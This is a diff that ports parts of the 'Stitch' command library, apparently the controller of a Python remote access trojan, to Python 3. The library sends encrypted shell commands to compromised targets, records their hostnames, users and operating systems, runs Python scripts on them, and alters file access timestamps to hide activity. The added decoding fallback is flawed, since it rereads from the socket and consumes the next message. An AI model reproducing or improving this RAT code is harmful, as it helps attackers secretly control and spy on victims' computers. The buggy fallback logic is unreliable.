@@ -14,7 +14,7 @@ def st_recvall(client, count, aes_enc=None, encryption=True):
         return decrypt(buf, aes_enc)
 
 def st_receive(client,aes_enc):
-    full_response = ""
+    full_response = b""
     while True:
         lengthbuf = st_recvall(client, 4, encryption=False)
         length, = struct.unpack('!i', lengthbuf)
@@ -30,7 +30,10 @@ def st_send(client, data, aes_enc):
         cmd = encrypt(data[:1024], aes_enc)
         length = len(cmd)
         client.sendall(struct.pack('!i', length))
-        client.sendall(cmd)
+        if type(cmd) is not bytes:
+            client.sendall(cmd.encode())
+        else:
+            client.sendall(cmd)
         data = data[1024:]
     eof = encrypt(st_eof, aes_enc)
     eof_len = len(eof)
@@ -38,8 +41,8 @@ def st_send(client, data, aes_enc):
     client.sendall(eof)
 
 class stitch_commands_library:
-    __slots__ = ['client', 'cli_target', 'cli_port', 'cli_os', 'cli_platform',
-                 'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp', ]
+    __slots__ = ['client', 'cli_target', 'cli_port', 'aes_key', 'cli_os', 'cli_platform',
+                 'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp', 'cli_hosts_file', 'Config', 'cfgfile']
 
     def __init__(self, client, target, port, aes_key, os, platform, hostname, user, dwld, temp):
         self.client = client
@@ -60,11 +63,11 @@ class stitch_commands_library:
     def history_check(self):
         self.Config = configparser.ConfigParser()
         self.Config.read(hist_ini)
-        self.cfgfile = open(hist_ini,'wb')
+        self.cfgfile = open(hist_ini,'w')
         if self.cli_target not in self.Config.sections():
             self.Config.add_section(self.cli_target)
             st_log.info('Connected to {} for the very first time'.format(self.cli_target))
-        self.Config.set(self.cli_target,'port',self.cli_port)
+        self.Config.set(self.cli_target,'port',str(self.cli_port))
         self.Config.set(self.cli_target,'user', self.cli_user)
         self.Config.set(self.cli_target,'os',self.cli_platform)
         self.Config.set(self.cli_target,'hostname', self.cli_hostname)
@@ -78,7 +81,7 @@ class stitch_commands_library:
     def send(self, data): return st_send(self.client,data,self.aes_key)
 
     def is_alive(self, line):
-        if not line.startswith('cls') and not line.startswith('clear'):
+        if line not in ['cls', 'clear']:
             try:
                 self.send('echo hello')
                 self.receive()
@@ -106,7 +109,7 @@ class stitch_commands_library:
                 if not py_file.endswith('.py') or os.path.isdir(py_file_path):
                     st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                     return
-                with open(py_file_path,'rb') as c:
+                with open(py_file_path,'r') as c:
                     for line in c.readlines():
                         code += line
                 if pylib:
@@ -442,7 +445,17 @@ class stitch_commands_library:
         else:
             cmd = 'ls -alh {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+        decode_error = 0
+        try:
+            st_print(self.receive().decode('gbk'))
+        except:
+            decode_error = 1
+        if decode_error:
+            try:
+                st_print(self.receive().decode())
+                decode_error = 0
+            except:
+                decode_error = 1
 
     def lsmod(self, args):
         if windows_client(system=self.cli_os):
@@ -622,7 +635,7 @@ class stitch_commands_library:
 
     def exit(self, alive=True):
         if alive: self.send("end_connection")
-        st_print("[-] Disconnected from {}\n".format(self.cli_target))
+        st_print(f"[-] Disconnected from {self.cli_target}\n")
         self.client.close()
         return True
 
@@ -712,7 +725,17 @@ class stitch_commands_library:
             self.pyexec('editAccessed.py',pylib=True)
             self.send(editfile)
             self.send(edittime)
-            st_print(self.receive())
+            decode_error = 0
+            try:
+                st_print(self.receive().decode('gbk'))
+            except:
+                decode_error = 1
+            if decode_error:
+                try:
+                    st_print(self.receive().decode())
+                    decode_error = 0
+                except:
+                    decode_error = 1
         else:
             usage_editaccessed()
 
